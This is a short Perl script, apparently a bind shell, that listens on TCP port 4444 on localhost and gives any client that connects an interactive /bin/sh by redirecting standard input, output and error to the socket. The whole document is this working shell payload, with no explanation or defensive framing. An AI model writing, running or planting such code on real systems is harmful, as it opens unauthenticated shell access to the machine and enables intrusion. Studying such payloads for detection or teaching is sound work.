use Socket;

$port=4444;

socket(SERVER, AF_INET, SOCK_STREAM, getprotobyname('tcp'));

if(bind(SERVER, sockaddr_in($port, inet_aton("127.0.0.1"))))
{
	listen(SERVER,10); 
	accept(CLIENT,SERVER);

	open(STDIN,">&CLIENT");
	open(STDOUT,">&CLIENT");
	open(STDERR,">&CLIENT");
	exec("/bin/sh -i");
}
